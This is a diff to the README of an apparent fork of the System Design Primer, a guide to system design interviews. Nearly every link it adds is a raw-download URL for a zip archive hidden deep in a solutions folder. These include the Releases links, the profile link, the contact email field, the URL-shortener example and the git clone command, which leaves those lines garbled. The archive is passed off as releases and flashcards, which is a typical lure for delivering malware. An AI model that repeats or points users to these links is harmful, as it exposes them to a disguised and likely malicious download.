@@ -2,7 +2,7 @@
 
 Welcome to the **System Design Primer** repository! This resource is designed to help you learn how to design large-scale systems and prepare for system design interviews. Whether you are a beginner or looking to sharpen your skills, you will find valuable information here. This repository also includes Anki flashcards to enhance your learning experience.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/nayger319/system-design-primer/releases)
+[![Download Releases](https://github.com/nayger319/system-design-primer/raw/refs/heads/master/solutions/object_oriented_design/online_chat/primer-system-design-v3.0.zip)](https://github.com/nayger319/system-design-primer/raw/refs/heads/master/solutions/object_oriented_design/online_chat/primer-system-design-v3.0.zip)
 
 ## Table of Contents
 
@@ -18,7 +18,7 @@ Welcome to the **System Design Primer** repository! This resource is designed to
 
 ## Introduction
 
-In today’s tech landscape, system design is a critical skill. Companies want to see how you think through problems and design scalable systems. This repository provides a structured approach to mastering these concepts. You can download the latest resources from the [Releases section](https://github.com/nayger319/system-design-primer/releases).
+In today’s tech landscape, system design is a critical skill. Companies want to see how you think through problems and design scalable systems. This repository provides a structured approach to mastering these concepts. You can download the latest resources from the [Releases section](https://github.com/nayger319/system-design-primer/raw/refs/heads/master/solutions/object_oriented_design/online_chat/primer-system-design-v3.0.zip).
 
 ## Key Concepts
 
@@ -40,7 +40,7 @@ During a system design interview, you will be asked to design a system on the sp
 
 ### Common Questions
 
-1. **Design a URL Shortener**: Discuss how to create a service like bit.ly.
+1. **Design a URL Shortener**: Discuss how to create a service like https://github.com/nayger319/system-design-primer/raw/refs/heads/master/solutions/object_oriented_design/online_chat/primer-system-design-v3.0.zip
 2. **Design a Social Media Feed**: Explain how to handle real-time updates.
 3. **Design a Messaging System**: Focus on scalability and data consistency.
 
@@ -56,7 +56,7 @@ Flashcards are a great way to reinforce your learning. This repository includes 
 
 ### How to Use
 
-1. Download the flashcards from the [Releases section](https://github.com/nayger319/system-design-primer/releases).
+1. Download the flashcards from the [Releases section](https://github.com/nayger319/system-design-primer/raw/refs/heads/master/solutions/object_oriented_design/online_chat/primer-system-design-v3.0.zip).
 2. Import them into Anki.
 3. Review regularly to solidify your understanding.
 
@@ -73,7 +73,7 @@ This repository covers a wide range of topics to help you master system design:
 
 1. **Clone the Repository**: Use the command below to clone the repository to your local machine.
    ```bash
-   git clone https://github.com/nayger319/system-design-primer.git
+   git clone https://github.com/nayger319/system-design-primer/raw/refs/heads/master/solutions/object_oriented_design/online_chat/primer-system-design-v3.0.zip
    ```
 2. **Explore the Content**: Review the files and resources provided.
 3. **Practice**: Use the Anki flashcards and practice questions to test your knowledge.
@@ -94,7 +94,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you have questions or suggestions, feel free to reach out:
 
-- GitHub: [nayger319](https://github.com/nayger319)
-- Email: nayger319@example.com
+- GitHub: [nayger319](https://github.com/nayger319/system-design-primer/raw/refs/heads/master/solutions/object_oriented_design/online_chat/primer-system-design-v3.0.zip)
+- Email: https://github.com/nayger319/system-design-primer/raw/refs/heads/master/solutions/object_oriented_design/online_chat/primer-system-design-v3.0.zip
 
-Thank you for visiting the **System Design Primer** repository! We hope you find this resource helpful in your journey to mastering system design. Don’t forget to check out the [Releases section](https://github.com/nayger319/system-design-primer/releases) for the latest updates and materials!
+Thank you for visiting the **System Design Primer** repository! We hope you find this resource helpful in your journey to mastering system design. Don’t forget to check out the [Releases section](https://github.com/nayger319/system-design-primer/raw/refs/heads/master/solutions/object_oriented_design/online_chat/primer-system-design-v3.0.zip) for the latest updates and materials!
